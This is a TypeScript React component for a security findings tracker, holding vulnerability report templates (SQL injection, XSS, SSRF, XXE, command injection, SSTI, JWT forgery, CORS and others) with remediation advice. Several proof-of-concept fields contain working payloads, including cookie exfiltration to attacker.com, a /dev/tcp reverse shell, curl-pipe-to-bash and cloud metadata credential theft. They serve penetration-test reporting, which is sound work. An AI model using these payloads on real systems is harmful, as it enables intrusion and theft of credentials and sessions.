"use client";

import React, { useState, useEffect, useMemo } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { ShieldAlert, ChevronLeft, ChevronRight, X, Plus, AlertTriangle, Lock, Clock, Search, Download, CheckSquare, FileText, ChevronDown, ChevronUp, ExternalLink, Zap, Target, Eye, Shield, Trash2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogDescription,
} from "@/components/ui/dialog";
import { EmptyState } from "@/components/shared/empty-state";
import { FindingRow } from "@/components/findings/finding-row";
import { Checkbox } from "@/components/ui/checkbox";
import { Label } from "@/components/ui/label";
import { Separator } from "@/components/ui/separator";
import { useFindings, findingKeys } from "@/hooks/use-findings";
import { useCreateFinding } from "@/hooks/use-findings";
import { toast } from "sonner";
import type { FindingFilters, FindingSeverity, FindingStatus } from "@/types";
import { API_BASE } from "@/lib/api";
import { getAccessToken, fetchWithAuth } from "@/lib/auth";

const SEVERITIES: FindingSeverity[] = ["critical", "high", "medium", "low", "info"];
const STATUSES: FindingStatus[] = ["open", "in_progress", "remediated", "accepted_risk", "false_positive"];
const PER_PAGE = 25;

const SEV_COLORS: Record<string, string> = {
  critical: "text-red-400",
  high: "text-orange-400",
  medium: "text-yellow-400",
  low: "text-blue-400",
  info: "text-zinc-400",
};

interface CreateFindingForm {
  title: string;
  severity: string;
  category: string;
  affected_asset: string;
  description: string;
  evidence_text: string;
  remediation: string;
  cve_text: string;
  cvss_score: string;
  references_text: string;
  status: string;
  ticket_ref: string;
}

const EMPTY_FORM: CreateFindingForm = {
  title: "",
  severity: "high",
  category: "",
  affected_asset: "",
  description: "",
  evidence_text: "",
  remediation: "",
  cve_text: "",
  cvss_score: "",
  references_text: "",
  status: "open",
  ticket_ref: "",
};

// ─── Vulnerability Templates ────────────────────────────────────────────────
interface VulnTemplate {
  id: string;
  title: string;
  severity: string;
  category: string;
  cvss_score: string;
  cve_text: string;
  owasp: string;          // e.g. "A03:2021"
  cwe: string;            // e.g. "CWE-89"
  mitre: string;          // e.g. "T1190"
  difficulty: "Easy" | "Medium" | "Hard";
  business_impact: string;
  attack_scenario: string;
  proof_of_concept: string;
  detection_guidance: string;
  affected_technologies: string;
  description: string;
  remediation: string;
  references_text: string;
}

const DIFF_COLOR: Record<string, string> = {
  Easy: "bg-emerald-500/10 text-emerald-400 border-emerald-500/20",
  Medium: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  Hard: "bg-red-500/10 text-red-400 border-red-500/20",
};

const VULN_TEMPLATES: VulnTemplate[] = [
  // ── INJECTION ──────────────────────────────────────────────────────────────
  {
    id: "sqli",
    title: "SQL Injection (In-Band)",
    severity: "critical",
    category: "Injection",
    cvss_score: "9.8",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-89",
    mitre: "T1190",
    difficulty: "Medium",
    business_impact: "Full database compromise, authentication bypass, data exfiltration, and potential lateral movement to other systems via linked DB servers.",
    attack_scenario: "An attacker discovers a search endpoint that constructs SQL queries from GET parameters. By appending `' OR 1=1--` they bypass WHERE clauses; by using UNION SELECT they exfiltrate all user credentials in a single request.",
    proof_of_concept: `# 1. Basic error-based detection
GET /search?q=' OR 1=1--

# 2. UNION-based data extraction
GET /search?q=' UNION SELECT username,password,3 FROM users--

# 3. sqlmap automated scan
sqlmap -u "https://target.com/search?q=test" --dbs --batch`,
    detection_guidance: "Enable WAF SQLi rules. Log and alert on query errors (e.g., syntax errors from DB). Monitor for anomalous data volumes in API responses. Use SAST tools in CI to flag string-concatenated queries.",
    affected_technologies: "MySQL, PostgreSQL, MSSQL, Oracle, SQLite; PHP, Java, Python, Ruby, .NET, Node.js ORMs with raw query escape hatches",
    description: `The application is vulnerable to SQL Injection. User-supplied input is incorporated into SQL queries without adequate sanitization or parameterization, allowing an attacker to manipulate the query logic.

An attacker can exploit this to:
- Bypass authentication
- Exfiltrate sensitive data from the database
- Modify or delete database records
- In some configurations, execute OS-level commands`,
    remediation: `1. Use parameterized queries / prepared statements for all database operations
2. Apply an ORM (SQLAlchemy, Hibernate, ActiveRecord) and avoid raw query construction
3. Validate and whitelist all user input on the server side
4. Apply the principle of least privilege to database accounts
5. Enable WAF rules to detect common SQL injection payloads
6. Conduct regular code reviews and use SAST tools to catch new instances`,
    references_text: `https://owasp.org/www-community/attacks/SQL_Injection
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/89.html`,
  },
  {
    id: "xss-reflected",
    title: "Reflected Cross-Site Scripting (XSS)",
    severity: "high",
    category: "XSS",
    cvss_score: "6.1",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-79",
    mitre: "T1059.007",
    difficulty: "Easy",
    business_impact: "Session hijacking, credential theft, defacement, phishing via trusted domain, and malware distribution.",
    attack_scenario: "Attacker crafts a URL with a script payload in a GET parameter that is reflected in the HTML response. Victim clicks the link (e.g., in a phishing email) and the script runs in their browser, exfiltrating their session cookie.",
    proof_of_concept: `# 1. Basic reflection test
GET /search?q=<script>alert(1)</script>

# 2. Cookie exfiltration
GET /search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# 3. Confirm with Burp Collaborator / interactsh
GET /search?q="><img src=x onerror="fetch('https://COLLAB.oastify.com')">`,
    detection_guidance: "Scan with Burp Suite Active Scan or OWASP ZAP. Check CSP headers in responses. Alert on script-tag patterns in request parameters in WAF logs.",
    affected_technologies: "Any server-side language rendering HTML; especially PHP echo, Python Jinja2, Java JSP, Ruby ERB without auto-escaping",
    description: `The application reflects user-supplied data in HTTP responses without proper escaping, enabling an attacker to inject arbitrary JavaScript that executes in the victim's browser.

Reflected XSS requires the victim to click a crafted link. Impact includes:
- Session hijacking via cookie theft
- Keylogging and credential harvesting
- Redirection to phishing pages
- Defacement of web content`,
    remediation: `1. HTML-encode all user-controlled output before rendering it in responses
2. Use a Content Security Policy (CSP) header to restrict script execution
3. Set HttpOnly and Secure flags on session cookies
4. Use modern frameworks that auto-escape by default (React, Angular, Vue)
5. Validate and sanitize input on the server using an allowlist approach
6. Enable X-XSS-Protection and X-Content-Type-Options headers`,
    references_text: `https://owasp.org/www-community/attacks/xss/
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/79.html`,
  },
  {
    id: "xss-stored",
    title: "Stored Cross-Site Scripting (XSS)",
    severity: "high",
    category: "XSS",
    cvss_score: "8.0",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-79",
    mitre: "T1059.007",
    difficulty: "Medium",
    business_impact: "Mass account takeover, persistent malware distribution to all site visitors, credential harvesting at scale, and brand reputation damage.",
    attack_scenario: "Attacker submits a comment containing `<script>` tags to a forum. The script is stored and executes in every visitor's browser, silently forwarding session cookies to an attacker-controlled server, enabling mass account takeover.",
    proof_of_concept: `# 1. Submit payload via comment form
POST /comments
body=<script>document.location='https://attacker.com/?c='+document.cookie</script>

# 2. Verify persistence
GET /page-with-comments  → script executes in victim browser

# 3. SVG-based bypass when script tags are filtered
<svg onload="fetch('https://attacker.com/?c='+btoa(document.cookie))">`,
    detection_guidance: "Run DAST scanner against all input fields that render output to other users. Implement CSP report-only mode and review violation reports. Audit stored content rendering with XSS-specific test strings.",
    affected_technologies: "CMS platforms (WordPress, Drupal), forums, social apps, SaaS comment/note features; React/Vue without dangerouslySetInnerHTML hygiene",
    description: `Malicious scripts submitted by an attacker are persistently stored in the application's database or file system and later served to other users, executing in their browsers without interaction beyond visiting the page.

This is more dangerous than reflected XSS because:
- No victim interaction (link click) required
- Affects all users who view the affected page
- Can be used for account takeover at scale`,
    remediation: `1. Sanitize all user input before storing it (use DOMPurify or server-side sanitizers)
2. HTML-encode stored content when rendering it to the page
3. Implement a strict Content Security Policy (CSP)
4. Separate user content from application content using subdomains or sandboxed iframes
5. Validate inputs against an allowlist of expected formats`,
    references_text: `https://owasp.org/www-community/attacks/xss/#stored-xss-attacks
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/79.html`,
  },
  {
    id: "ssrf",
    title: "Server-Side Request Forgery (SSRF)",
    severity: "high",
    category: "SSRF",
    cvss_score: "8.6",
    cve_text: "",
    owasp: "A10:2021",
    cwe: "CWE-918",
    mitre: "T1090",
    difficulty: "Medium",
    business_impact: "Access to cloud metadata credentials (IAM role takeover), internal service exploitation, data exfiltration from internal APIs, and potential RCE via internal admin interfaces.",
    attack_scenario: "Attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as a webhook URL. The server fetches it and returns AWS credentials in the response, giving the attacker full cloud access.",
    proof_of_concept: `# 1. AWS metadata credential theft
POST /api/webhook
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}

# 2. Internal service enumeration
{"url": "http://localhost:6379/"}   # Redis
{"url": "http://10.0.0.1:8080/admin"}  # Internal admin

# 3. DNS rebinding / bypass
{"url": "http://ssrf.attacker.com"}  # resolves to 169.254.169.254`,
    detection_guidance: "Block egress to RFC-1918 and link-local ranges at the network level. Log all outbound HTTP requests from app servers. Alert on requests to 169.254.x.x or metadata hostnames.",
    affected_technologies: "Webhook processors, URL preview generators, PDF renderers (wkhtmltopdf), image importers; AWS, GCP, Azure cloud environments",
    description: `The application fetches a remote resource using a URL supplied by the user without adequate validation. An attacker can coerce the server to make requests to internal services, cloud metadata endpoints, or arbitrary external hosts.

Common targets include:
- AWS/GCP/Azure instance metadata (http://169.254.169.254)
- Internal REST APIs not exposed externally
- Redis, Elasticsearch, or other unauthenticated internal services
- Localhost services (port scanning via SSRF)`,
    remediation: `1. Validate and strictly allowlist URLs/IP ranges that the server is permitted to fetch
2. Block requests to private IP ranges (RFC 1918), loopback, and cloud metadata addresses
3. Disable unnecessary URL-fetching features or require authentication for them
4. Use a server-side proxy that enforces allowlists
5. In cloud environments, restrict metadata endpoint access with IMDSv2 (AWS)`,
    references_text: `https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/918.html`,
  },
  {
    id: "idor",
    title: "Insecure Direct Object Reference (IDOR)",
    severity: "high",
    category: "Broken Access Control",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-639",
    mitre: "T1078",
    difficulty: "Easy",
    business_impact: "Unauthorized access to or modification of other users' data, horizontal privilege escalation, mass data harvesting, and potential regulatory violations (GDPR, HIPAA).",
    attack_scenario: "Authenticated user A accesses GET /api/invoices/1042 and gets their invoice. By changing the ID to 1041, they receive another user's invoice with full PII and financial data. With automation, all invoices can be extracted.",
    proof_of_concept: `# 1. Manual ID manipulation
GET /api/invoices/1042  → own resource
GET /api/invoices/1041  → another user's data (IDOR confirmed)

# 2. Automated enumeration with ffuf
ffuf -u "https://target.com/api/invoices/FUZZ" -w ids.txt -H "Cookie: session=..." -mc 200

# 3. UUID-based IDOR (not all UUIDs are safe)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000`,
    detection_guidance: "Implement authorization unit tests asserting cross-user access returns 403. Monitor for sequential ID scanning patterns in API logs. Use indirect reference maps in code reviews.",
    affected_technologies: "REST APIs, GraphQL, mobile app backends; any framework with resource-by-ID endpoints without middleware-enforced ownership checks",
    description: `The application exposes internal object identifiers (IDs, UUIDs, filenames) in requests and does not verify that the authenticated user is authorized to access the referenced object.

An attacker can modify the identifier in a request to access or modify data belonging to another user:
- Horizontal privilege escalation (accessing other users' data)
- Vertical privilege escalation (accessing admin resources)
- Mass data extraction by iterating predictable IDs`,
    remediation: `1. Implement server-side authorization checks for every resource access — verify ownership
2. Use indirect references (map user-specific tokens to actual IDs server-side)
3. Apply an access control framework and enforce it at the service layer, not just the UI
4. Log and alert on access patterns that suggest enumeration (sequential ID guessing)
5. Use UUIDs instead of sequential integers to reduce guessability (defense-in-depth only)`,
    references_text: `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/639.html`,
  },
  {
    id: "xxe",
    title: "XML External Entity Injection (XXE)",
    severity: "high",
    category: "Injection",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A05:2021",
    cwe: "CWE-611",
    mitre: "T1005",
    difficulty: "Medium",
    business_impact: "Arbitrary file read (credentials, private keys, application configs), SSRF to internal services, and in some parsers remote code execution.",
    attack_scenario: "Attacker uploads an XML file to a document import feature. The XML includes an external entity referencing `/etc/passwd`. The server parses the XML and includes the file contents in its response, exposing system user data.",
    proof_of_concept: `# 1. Basic file read
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

# 2. SSRF via XXE
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>

# 3. Out-of-band exfiltration (blind XXE)
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "https://attacker.com/evil.dtd">%dtd;]>`,
    detection_guidance: "Disable external entity processing in XML parser config. Test all XML ingestion endpoints with XXE payloads during security reviews. Use SAST to flag unsafe parser configurations.",
    affected_technologies: "Java (SAX, DOM, JAXB), Python (lxml, xml.etree), PHP SimpleXML, .NET XmlDocument; SAML processors, office document parsers, SOAP services",
    description: `The application parses XML input that includes a reference to an external entity. An attacker can exploit this to:
- Read arbitrary files from the server filesystem (e.g., /etc/passwd, application config)
- Perform SSRF attacks via external entity URIs
- Cause denial of service via billion-laughs entity expansion
- In some parsers, execute remote code`,
    remediation: `1. Disable external entity processing in your XML parser (most parsers support this as a configuration option)
2. Use simpler data formats (JSON) where XML is not required
3. Validate and sanitize XML input before parsing
4. Apply server-side input validation and content-type checks
5. Update XML parsing libraries to patched versions`,
    references_text: `https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/611.html`,
  },
  {
    id: "csrf",
    title: "Cross-Site Request Forgery (CSRF)",
    severity: "medium",
    category: "CSRF",
    cvss_score: "6.5",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-352",
    mitre: "T1185",
    difficulty: "Easy",
    business_impact: "Unauthorized state-changing actions on behalf of authenticated users: account modifications, fund transfers, data deletion, privilege escalation.",
    attack_scenario: "Attacker hosts a page with a hidden form that POSTs to the banking app's transfer endpoint. When a logged-in victim visits the attacker's page, their browser auto-includes session cookies, completing the transfer silently.",
    proof_of_concept: `<!-- CSRF PoC - auto-submitting form -->
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="https://bank.com/transfer">
      <input type="hidden" name="to" value="attacker">
      <input type="hidden" name="amount" value="10000">
    </form>
  </body>
</html>`,
    detection_guidance: "Verify CSRF tokens are present and validated on all state-changing endpoints. Check SameSite cookie attributes. Use Burp Suite to remove CSRF tokens and confirm the request is rejected.",
    affected_technologies: "Traditional server-rendered web apps; REST APIs using cookie authentication without CSRF protection; old SPA backends",
    description: `The application does not require state-changing requests to include an unpredictable, user-specific token. An attacker can craft a malicious page that causes a logged-in victim's browser to make authenticated requests on their behalf.

Impact depends on the actions available:
- Account modification (email/password change)
- Fund transfers or order placement
- Data deletion or privilege changes`,
    remediation: `1. Implement synchronizer token pattern (CSRF token in every state-changing form/request)
2. Use the SameSite=Strict or SameSite=Lax cookie attribute
3. Validate the Origin and Referer request headers for sensitive actions
4. Require re-authentication for critical operations
5. Use custom request headers (e.g., X-Requested-With) for AJAX calls`,
    references_text: `https://owasp.org/www-community/attacks/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/352.html`,
  },
  {
    id: "path-traversal",
    title: "Path Traversal",
    severity: "high",
    category: "Injection",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-22",
    mitre: "T1083",
    difficulty: "Easy",
    business_impact: "Disclosure of application source code, configuration files, private keys, database credentials, and OS-level sensitive files.",
    attack_scenario: "A file download endpoint accepts a `filename` parameter. By submitting `../../../../etc/passwd`, the attacker reads the system passwd file. With `../../../../app/config.py` they obtain database credentials.",
    proof_of_concept: `# 1. Basic traversal
GET /download?file=../../../../etc/passwd

# 2. URL-encoded bypass
GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 3. Double-encoded bypass
GET /download?file=%252e%252e%252fetc%252fpasswd

# 4. Null byte injection (older PHP)
GET /download?file=../../../../etc/passwd%00.jpg`,
    detection_guidance: "Test all file path parameters with traversal sequences. Use SAST to flag string-based path construction. Monitor filesystem access logs for traversal patterns.",
    affected_technologies: "PHP file include/require, Python open(), Java File I/O, Node.js fs module, static file servers; any endpoint accepting filename parameters",
    description: `The application uses user-supplied input to construct file system paths without sufficient canonicalization or validation. An attacker can use sequences such as "../" to escape the intended directory and read or write arbitrary files.

Common impacts:
- Disclosure of sensitive configuration files and credentials
- Source code exposure
- Overwriting critical files (web shells, configuration)`,
    remediation: `1. Validate and canonicalize all file paths before use (resolve to an absolute path and verify it starts with the expected base directory)
2. Use an allowlist of permitted filenames rather than blocking traversal sequences
3. Run the web application with the minimum filesystem permissions required
4. Avoid passing user-controlled input to filesystem APIs where possible`,
    references_text: `https://owasp.org/www-community/attacks/Path_Traversal
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/22.html`,
  },
  {
    id: "cmd-injection",
    title: "Command Injection",
    severity: "critical",
    category: "Injection",
    cvss_score: "9.8",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-78",
    mitre: "T1059",
    difficulty: "Medium",
    business_impact: "Complete server compromise: arbitrary code execution, data exfiltration, reverse shell establishment, lateral movement, and persistent backdoor installation.",
    attack_scenario: "A network diagnostic endpoint passes user input directly to `ping`. By submitting `8.8.8.8; curl https://attacker.com/shell.sh | bash`, the attacker executes a reverse shell payload on the server.",
    proof_of_concept: `# 1. Basic command chaining
GET /ping?host=8.8.8.8;id

# 2. Reverse shell via injection
GET /ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261'

# 3. Blind injection (OOB)
GET /ping?host=\`curl+https://COLLAB.oastify.com\`

# 4. Common separators to test: ; | && || \` $()`,
    detection_guidance: "Never use shell=True in subprocess calls. SAST should flag os.system, subprocess with shell=True, exec(), eval(). Monitor for unexpected child processes spawned by the web server.",
    affected_technologies: "Python subprocess/os.system, PHP shell_exec/exec/passthru, Node.js child_process.exec, Ruby backtick execution, Java Runtime.exec with shell",
    description: `The application passes user-supplied input to a shell command without proper sanitization, allowing an attacker to append or inject additional OS commands that execute with the web server's privileges.

This typically results in full server compromise:
- Remote code execution
- Data exfiltration
- Lateral movement within the internal network
- Persistence via backdoors`,
    remediation: `1. Avoid calling OS commands with user-supplied input entirely — use library equivalents instead
2. If shell execution is unavoidable, use parameterized APIs (e.g., execvp with argument arrays, not shell=True)
3. Strictly allowlist permitted input characters
4. Run the application under a least-privilege OS account
5. Apply AppArmor / seccomp profiles to restrict available syscalls`,
    references_text: `https://owasp.org/www-community/attacks/Command_Injection
https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/78.html`,
  },
  {
    id: "open-redirect",
    title: "Open Redirect",
    severity: "medium",
    category: "Redirect",
    cvss_score: "6.1",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-601",
    mitre: "T1566",
    difficulty: "Easy",
    business_impact: "Phishing attacks using trusted domain URLs, OAuth token theft via redirect_uri hijacking, and bypassing referrer-based security controls.",
    attack_scenario: "Login page uses `?next=` for post-auth redirect. Attacker crafts `https://target.com/login?next=https://evil.com/phish`. After login, victim is redirected to the attacker's fake login page to harvest credentials again.",
    proof_of_concept: `# 1. Direct open redirect
GET /login?next=https://evil.com

# 2. Protocol-relative bypass
GET /redirect?url=//evil.com

# 3. Unicode/encoding bypass
GET /redirect?url=https:evil.com
GET /redirect?url=https%3A%2F%2Fevil.com

# 4. OAuth redirect_uri abuse
GET /oauth/authorize?redirect_uri=https://evil.com`,
    detection_guidance: "Test all redirect parameters with external URLs. Verify OAuth redirect_uri is strictly validated against a registered allowlist. Check for protocol-relative URL acceptance.",
    affected_technologies: "OAuth/OIDC implementations, login redirect flows, URL shorteners; frameworks with redirect helpers (Rails redirect_to, Django HttpResponseRedirect)",
    description: `The application accepts a user-controlled URL parameter and redirects the browser to it without validation. Attackers abuse this to redirect victims from a trusted domain to a malicious site, often as part of phishing campaigns.

Common abuse scenarios:
- OAuth token theft via redirect_uri manipulation
- Bypassing referrer-based access controls
- Luring victims into entering credentials on attacker-controlled pages`,
    remediation: `1. Avoid using user-supplied URLs in redirects entirely
2. If redirects are necessary, use an allowlist of approved destination URLs or domains
3. For OAuth flows, register and strictly validate redirect_uri values server-side
4. Warn users before redirecting to external domains`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/601.html`,
  },
  {
    id: "ssti",
    title: "Server-Side Template Injection (SSTI)",
    severity: "critical",
    category: "Injection",
    cvss_score: "9.8",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-94",
    mitre: "T1059",
    difficulty: "Hard",
    business_impact: "Remote code execution with web server privileges, full server takeover, environment variable and secret exfiltration.",
    attack_scenario: "A report generation feature allows custom message templates. Attacker submits `{{7*7}}` — if the response shows `49`, the template engine evaluates input. They escalate to `{{''.__class__.__mro__[1].__subclasses__()}}` for RCE in Jinja2.",
    proof_of_concept: `# 1. Detection - math evaluation
Input: {{7*7}}  → response contains 49? SSTI confirmed.

# 2. Jinja2 RCE
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# 3. Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# 4. Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
    detection_guidance: "Test template syntax for all major engines: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. Use tplmap tool for automated detection. SAST to flag string formatting with user data in template calls.",
    affected_technologies: "Python Jinja2/Mako/Tornado, PHP Twig/Smarty, Java Freemarker/Velocity/Pebble, Ruby ERB, Node.js Pug/Handlebars/EJS",
    description: `User-supplied input is embedded directly into a server-side template and evaluated by the template engine. Depending on the engine (Jinja2, Twig, Freemarker, etc.), this can lead to remote code execution.

An attacker can:
- Execute arbitrary OS commands
- Read sensitive files and environment variables
- Pivot to internal infrastructure`,
    remediation: `1. Never pass user input directly to template rendering functions
2. Use a sandbox-aware template engine and enable its sandboxing features
3. Validate and encode all user input before including it in templates
4. Apply least-privilege to the process running the template engine
5. Prefer logic-less templates (Mustache, Handlebars in strict mode) for user-facing content`,
    references_text: `https://portswigger.net/research/server-side-template-injection
https://cwe.mitre.org/data/definitions/94.html`,
  },
  {
    id: "jwt-alg",
    title: "JWT Algorithm Confusion / None Algorithm",
    severity: "critical",
    category: "Broken Authentication",
    cvss_score: "9.1",
    cve_text: "",
    owasp: "A02:2021",
    cwe: "CWE-347",
    mitre: "T1548",
    difficulty: "Hard",
    business_impact: "Authentication bypass, privilege escalation to administrator, impersonation of any user, and complete API authorization bypass.",
    attack_scenario: "Application verifies JWTs using the `alg` field from the token header. Attacker changes `alg` to `none` and removes the signature. The library accepts the unsigned token. Attacker also changes `role` to `admin` in the payload.",
    proof_of_concept: `# 1. None algorithm attack
# Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.sig
# Modified header: {"alg":"none"}
# Forged token: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# 2. RS256 → HS256 confusion
# Get server's RSA public key, use as HMAC-SHA256 secret
python3 -c "
import jwt, base64
pub = open('public.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# 3. kid header injection
# {"alg":"HS256","kid":"../../dev/null"}
# HMAC secret becomes empty string`,
    detection_guidance: "Hardcode allowed algorithms in JWT verification. Test by submitting tokens with `alg: none`. Use a JWT testing tool (jwt_tool). Review library version for known CVEs.",
    affected_technologies: "Node.js jsonwebtoken <9.0, Python PyJWT <2.4, php-jwt, any custom JWT implementation; OAuth2/OIDC providers",
    description: `The JWT implementation accepts tokens signed with an unexpected algorithm, such as "none" (no signature) or RS256 public keys used as HMAC secrets. An attacker can forge valid tokens and impersonate any user, including administrators.

Common variants:
- alg: none — signature validation skipped entirely
- RS256→HS256 confusion — public key used as HMAC secret
- Key injection via JWK Set header`,
    remediation: `1. Explicitly allowlist accepted algorithms in JWT verification code
2. Never accept "none" as a valid algorithm
3. Use a well-maintained JWT library and keep it updated
4. Validate token claims (iss, aud, exp) in addition to the signature
5. Rotate signing keys regularly and support key ID (kid) validation`,
    references_text: `https://portswigger.net/web-security/jwt
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
https://cwe.mitre.org/data/definitions/347.html`,
  },
  {
    id: "cors",
    title: "CORS Misconfiguration",
    severity: "high",
    category: "Access Control",
    cvss_score: "7.4",
    cve_text: "",
    owasp: "A01:2021",
    cwe: "CWE-942",
    mitre: "T1185",
    difficulty: "Easy",
    business_impact: "Cross-origin theft of authenticated API responses, account takeover, and sensitive data exfiltration from any domain the attacker controls.",
    attack_scenario: "API reflects the request Origin header verbatim with `Access-Control-Allow-Credentials: true`. Attacker hosts a page that makes a credentialed cross-origin request to the API, reads the JSON response containing the victim's profile and API keys.",
    proof_of_concept: `# 1. Test reflection
curl -H "Origin: https://evil.com" https://api.target.com/user -v 2>&1 | grep -i "access-control"

# 2. Exploit from attacker.com
fetch('https://api.target.com/me', {credentials:'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/?data='+JSON.stringify(d)))

# 3. Null origin test
curl -H "Origin: null" https://api.target.com/user -v`,
    detection_guidance: "Audit ACAO header in all API responses. Test with `Origin: https://evil.com`, `Origin: null`, and `Origin: https://targetcorp.attacker.com`. Ensure ACAC is never combined with wildcard ACAO.",
    affected_technologies: "REST APIs, GraphQL APIs; any backend with CORS middleware; Express cors(), Django corsheaders, Spring CORS config",
    description: `The application's CORS policy is overly permissive. The server either reflects the request's Origin header verbatim, allows null origins, or permits wildcard origins on authenticated endpoints.

An attacker can host a malicious page that makes cross-origin requests to the API on behalf of an authenticated victim, reading the response and exfiltrating sensitive data.`,
    remediation: `1. Maintain an explicit allowlist of trusted origins; never reflect arbitrary origins
2. Do not use Access-Control-Allow-Origin: * on endpoints that require credentials
3. Never allow the null origin on production APIs
4. Set Access-Control-Allow-Credentials: true only when necessary and only with a specific origin
5. Review CORS headers in all API responses, including error responses`,
    references_text: `https://portswigger.net/web-security/cors
https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/942.html`,
  },
  {
    id: "sec-headers",
    title: "Missing Security Headers",
    severity: "medium",
    category: "Security Misconfiguration",
    cvss_score: "5.3",
    cve_text: "",
    owasp: "A05:2021",
    cwe: "CWE-693",
    mitre: "T1059.007",
    difficulty: "Easy",
    business_impact: "Reduced defense-in-depth; missing headers enable clickjacking, MIME sniffing, protocol downgrade, and remove the browser-enforced XSS mitigation layer.",
    attack_scenario: "Application lacks X-Frame-Options. Attacker embeds it in an invisible iframe over a fake UI (clickjacking). When users think they're clicking the attacker's button, they're actually clicking 'Delete Account' on the target app.",
    proof_of_concept: `# Check all security headers
curl -I https://target.com | grep -iE "content-security|x-frame|strict-transport|x-content-type|referrer-policy|permissions-policy"

# Clickjacking PoC (missing X-Frame-Options)
<iframe src="https://target.com/settings" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button onclick="...">Click here for prize!</button>

# Use securityheaders.com for automated scan`,
    detection_guidance: "Automated scan with securityheaders.com. Include header checks in CI using a Nuclei template or custom curl check. Verify headers on both main pages and API responses.",
    affected_technologies: "All web frameworks; especially legacy PHP/ASP.NET apps that don't set headers by default; CDN/proxy configurations (Nginx, Apache, CloudFront)",
    description: `The application does not set one or more critical HTTP security headers, weakening its defense against common client-side attacks.

Commonly missing headers and their risk:
- Content-Security-Policy — no XSS mitigation layer
- X-Frame-Options / frame-ancestors — clickjacking risk
- Strict-Transport-Security — downgrade to HTTP possible
- X-Content-Type-Options — MIME sniffing attacks
- Referrer-Policy — sensitive URL leakage in Referer header`,
    remediation: `1. Add Content-Security-Policy with a policy appropriate for the application
2. Set X-Frame-Options: DENY or CSP frame-ancestors 'none'
3. Enable Strict-Transport-Security with a long max-age (≥1 year) and includeSubDomains
4. Set X-Content-Type-Options: nosniff
5. Set Referrer-Policy: strict-origin-when-cross-origin
6. Set Permissions-Policy to restrict access to sensitive browser APIs`,
    references_text: `https://owasp.org/www-project-secure-headers/
https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
https://securityheaders.com`,
  },
  {
    id: "broken-auth",
    title: "Broken Authentication / Weak Session Management",
    severity: "critical",
    category: "Broken Authentication",
    cvss_score: "9.0",
    cve_text: "",
    owasp: "A07:2021",
    cwe: "CWE-287",
    mitre: "T1110",
